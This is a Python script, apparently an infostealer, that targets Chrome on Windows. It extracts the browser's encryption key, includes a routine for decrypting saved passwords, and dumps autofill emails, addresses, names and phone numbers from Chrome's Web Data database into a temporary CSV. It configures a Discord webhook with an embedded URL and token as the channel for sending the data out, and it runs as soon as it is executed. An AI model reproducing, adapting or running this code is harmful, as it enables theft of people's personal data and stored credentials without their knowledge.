
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from tempfile import TemporaryFile, gettempdir
from datetime import timezone, datetime, timedelta
from re import sub
import csv
from dhooks import Webhook, Embed, File
CURRENT_DIR = os.path.dirname(os.path.realpath(__file__))
CHROME_WEBDATA_FILE = TemporaryFile(mode='w', delete=False, suffix='.csv', newline='')
webdata_csv_writer = csv.writer(CHROME_WEBDATA_FILE)
hook = Webhook('https://discord.com/api/webhooks/886962488686567444/3k-npqP1ZT8tUYvtBMiMtOjSnfrQyFCgBBST8I4-j_qkR8VXJNz-o_aKE94UHYtT4e_7')

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def determine_empty(item):
    if isinstance(item, tuple):
        if not all(item) == True:
            return True
        return False

def convert_tuple_to_string(unformatted_list, formatted_list):
    for index in unformatted_list:
        formatted_list.append(index[0])

    
def save_web_data():

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Web Data")
    filename = "WebData.db"

    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    user_emails = ['EMAILS']
    user_address = ['ADDRESS']
    user_full_name = ['FULL NAME']
    user_phone_number = ['PHONE NUMBERS']
    unformatted_user_emails = cursor.execute("select email from autofill_profile_emails").fetchall()
    unformatted_user_emails[:] = [x for x in unformatted_user_emails if not determine_empty(x)]
    convert_tuple_to_string(unformatted_user_emails, user_emails)

    unformatted_user_address = cursor.execute("select street_address, city, state, zip_code from autofill_profile_addresses").fetchall()
    unformatted_user_address[:] = [x for x in unformatted_user_address if not determine_empty(x)]
    convert_tuple_to_string(unformatted_user_address, user_address)

    unformatted_user_full_name = cursor.execute("select full_name from autofill_profile_names").fetchall()
    unformatted_user_full_name[:] = [x for x in unformatted_user_full_name if not determine_empty(x)] 
    convert_tuple_to_string(unformatted_user_full_name, user_full_name)


    user_phone_numbers = cursor.execute("select number from autofill_profile_phones").fetchall()
    user_phone_numbers[:] = [x for x in user_phone_numbers if not determine_empty(x)]
    for phone_numbers in user_phone_numbers:
        first_index = phone_numbers[0]
        first_index = sub('[)( -]', '', first_index)
        user_phone_number.append(first_index)

    webdata_csv_writer.writerow(user_emails)
    webdata_csv_writer.writerow(user_phone_number)
    webdata_csv_writer.writerow(user_full_name)
    webdata_csv_writer.writerow(user_address)

    print(user_address)
    
    
   #for row in cursor.fetchall():
   #    
   #    origin_url = row[0]
   #    action_url = row[1]
   #    username = row[2]
   #    password = decrypt_password(row[3], key)
   #    date_created = row[4]
   #    date_last_used = row[5]        
   #    if username or password:
   #        writer.writerow([origin_url, username, password, {str(get_chrome_datetime(date_created))}, {str(get_chrome_datetime(date_last_used))}])
   #        password_count+=1
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
save_web_data()
